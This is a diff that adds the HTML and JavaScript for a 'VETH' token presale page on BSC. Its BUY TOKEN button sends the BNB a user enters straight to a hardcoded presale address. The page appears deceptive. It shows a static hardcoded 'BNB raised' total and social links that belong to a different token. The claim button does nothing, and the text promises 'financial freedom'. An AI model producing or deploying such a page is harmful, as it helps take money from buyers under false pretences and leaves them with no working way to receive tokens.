@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>VETH</title>
+    <link rel="shortcut icon" type="image/x-icon" href="logo.webp">
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="bootstrap.min.css" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Chewy&amp;display=swap" rel="stylesheet">
+</head>
+
+
+
+<body>
+    <div class="wrapper">
+        <!-- Sidebar  -->
+
+
+        <!-- Page Content  -->
+        <div id="content">
+
+
+
+            <div class="logo">
+                <img src="logo.webp" />
+                <span>VETH</span>
+            </div>
+            <div id="app">
+                <div class="head">
+                    <div class="row">
+                        <div class="col-md-4">
+                            <div class="box">
+                                <p> Wallet</p>
+                                <p id="myacc">x00000000..</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="box">
+                                <p> BSC Network</p>
+                                <button class="btn" id="con" onclick="onPageLoad()">CONNECT</button></div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="box">
+                                <p> BNB Balance</p>
+                                <span id="mybalance">0.0BNB</span>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-3">
+                            <div class="box1">
+                                <div class="info">
+                                    <h2>SOCIAL LINKS</h2>
+                                    <ul class="social">
+                                        <li>
+                                            <a href="https://t.me/dogebusd"><img src="telegram.svg"></a>
+                                        </li>
+                                        <li>
+                                            <a href="https://twitter.com/DogeCoin_BUSD"><img src="twitter.svg"></a>
+                                        </li>
+                                        <li>
+                                            <a href="#"><img src="reddit.svg"></a>
+                                        </li>
+                                        <li>
+                                            <a href="#"><img src="github.svg"></a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="tokenomics">
+                                    <h2>Tokenomics</h2>
+                                    <ul>
+                                        <li>Token Name: VETH</li>
+                                        <li>Token tricker: VETH</li>
+                                        <li>Token Supply: 100,000,000,000</li>
+                                        <li>Token Dec.: 18</li>
+                                        <li>Token type: BEP20</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                        </div>
+
+
+                        <div class="col-md-6">
+                            <div class="box1">
+                                <div class="title-area">
+                                    <h1 id="tokename">VETH</h1>
+                                    <h2 id="tokensymbol">VETH</h2>
+                                </div>
+                                <div id="desc">
+                                    VETH is the ultimate token that allow you to earn BUSD as you HODL! VETH, it is the way to financial freedom. With insane cashback in BUSD, this token is just gonna mooooon!. </div>
+                                <div class="contr">
+                                    <p>Presale Address : <a href="https://bscscan.com/address/0x74751474e3Bd520cfED38516cd69A9d79c959719"><span id="preddress">0x74751474e3Bd520cfED38516cd69A9d79c959719</span></a></p>
+                                    <p>Token Address : <a href="https://bscscan.com/token/0x88b215ee30d827eaec300240e6521e8ce0b89d2c"><span id="tkndress">0x88b215ee30d827eaec300240e6521e8ce0b89d2c</span> </a></p>
+                                    <span class="red">Do not send BNB to the token address!</span>
+                                </div>
+
+
+                                <div class="timer pt-4">
+                                    <img src="logo.webp" style="
+                width: 99px;
+                margin: auto;
+                display: block;
+                padding: 20px;
+            ">
+
+                                    <div id="countdown">
+                                        <h4>Presale end at:</h4>
+                                        <ul>
+                                            <li><span id="days"></span>day</li>
+                                            <li><span id="hours"></span>Hours</li>
+                                            <li><span id="minutes"></span>Minutes</li>
+                                            <li><span id="seconds"></span>Seconds</li>
+                                        </ul>
+                                    </div>
+
+                                </div>
+
+
+                                <div id="contents">
+                                    <div class="button-area">
+                                        <div class="balance-container">
+                                            <h3 id="headline"> </h3>
+                                            <div class="dbl">
+                                                <span id="devbalance">1.10</span>
+                                                <span>/</span>
+                                                <span id="am">20</span>
+                                                <span>BNB RAISED</span>
+
+                                                <input type="hidden" id="maxi" value="20"></input>
+                                                <P id="GFG">
+                                                </p>
+
+                                            </div>
+                                        </div>
+
+
+                                        <div class="input-container">
+                                            <img class="bnbi" src="bnb.svg" />
+                                            <input id="buyinput" class="input" value="0.01" placeholder="0.01"></input>
+                                        </div>
+                                        <p>Enter amount of BNB you want to contribute!</p>
+
+                                        <button class="btn" id="airbtn" onclick="buystt()"> <img src="buy.png" /><span>BUY TOKEN</span></button>
+
+                                    </div>
+                                    <div class="button-area">
+                                        <div class="balance-container">
+                                            <span id="locked-money">-</span>
+                                        </div>
+                                        <a class="btn btn-disable" id="withdraw">
+                                            <img src="buy.png" />
+                                            <span>CLAIM TOKEN</span>
+                                        </a>
+                                    </div>
+
+                                </div>
+                                <div class="contribute">
+                                    <br>
+
+                                    <div class="row">
+
+                                        <div class="col-md-6">
+                                            <div class="box1">
+                                                Your Contributed Amount:
+                                                <span id="contrib">0.00 </span>
+                                                <span id="contrib">BNB</span>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="box1">
+                                                Your Reserved Tokens::
+                                                <span id="contrib">0.00</span>
+                                                <span id="contrib">VETH</span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+
+
+
+
+                                </div>
+
+                            </div>
+                        </div>
+
+                        <div class="col-md-3">
+                            <div class="box1">
+                                <h2>PRESALE INFO</h2>
+                                <div class="details">
+                                    <table>
+                                        <tbody>
+
+                                            <tr>
+                                                <td>Token Name</td>
+                                                <td>VETH</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Token Tricker</td>
+                                                <td>VETH</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Supply</td>
+                                                <td>100,000,000,000</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Token Decimal</td>
+                                                <td>18</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Soft Cap</td>
+                                                <td>5 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Hard Cap</td>
+                                                <td>20 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Presale Rate</td>
+                                                <td>1,000,000,000 VETH per BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Minimum Contribution </td>
+                                                <td>0.01 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Maximum Contribution </td>
+                                                <td>4 BNB</td>
+                                            </tr>
+
+                                            <tr>
+                                                <td>PancakeSwap Listing Rate</td>
+                                                <td>830,000,000 VETH per BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Liquidity locked</td>
+                                                <td>70%</td>
+                                            </tr>
+
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+                <script src="web3.js"></script>
+                <script>
+                    let addr;
+                    const presaleadd = "0x74751474e3Bd520cfED38516cd69A9d79c959719";
+
+
+                    const loadweb3 = async() => {
+                        try {
+                            web3 = new web3js.myweb3(window.ethereum);
+
+                            let a = await ethereum.enable();
+                            addr = web3.utils.toChecksumAddress(a[0]);
+
+                            return (addr);
+
+                        } catch (error) {
+                            if (error.code === 4001) {
+                                console.log('Please connect to MetaMask.')
+                            } else {
+                                console.error(error)
+                            }
+                        }
+
+                    };
+
+
+
+
+
+                    const buystt = async() => {
+
+                        await loadweb3();
+
+                        if (addr == undefined) {
+                            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
+                        }
+
+                        let ethval = document.getElementById("buyinput").value;
+                        ethval = Number(ethval) * 1e18;
+
+                        web3.eth.sendTransaction({
+                            from: addr,
+                            to: presaleadd,
+                            value: ethval,
+                            gasLimit: 21000,
+                            gasPrice: 20000000000
+                        }, (err, res) => {
+                            if (!err) console.log(res);
+                            else console.log(err);
+                        });
+
+                    }
+                </script>
+
+
+                <script src="script.js"></script>
+                <script src="wesb3.min.js"></script>
+
+
+                <script>
+                    (function() {
+                        const second = 1000,
+                            minute = second * 60,
+                            hour = minute * 60,
+                            day = hour * 24;
+
+                        let launch = "july 4, 2021 14:00:00",
+                            countDown = new Date(launch).getTime(),
+                            x = setInterval(function() {
+
+                                let now = new Date().getTime(),
+                                    distance = countDown - now;
+
+                                document.getElementById("days").innerText = Math.floor(distance / (day)),
+                                    document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
+                                    document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
+                                    document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
+
+                                //do something later when date is reached
+                                if (distance < 0) {
+                                    let headline = document.getElementById("headline"),
+                                        countdown = document.getElementById("countdown"),
+                                        contents = document.getElementById("contents");
+
+                                    headline.innerText = " PRESALE IS LIVE ";
+                                    countdown.style.display = "none";
+                                    contents.style.display = "block";
+
+
+
+
+                                    clearInterval(x);
+                                }
+                                //seconds
+                            }, 0)
+                    }());
+                </script>
+
+
+
+            </div>
+        </div>
+
+
+
+
+</body>
+
+</html>
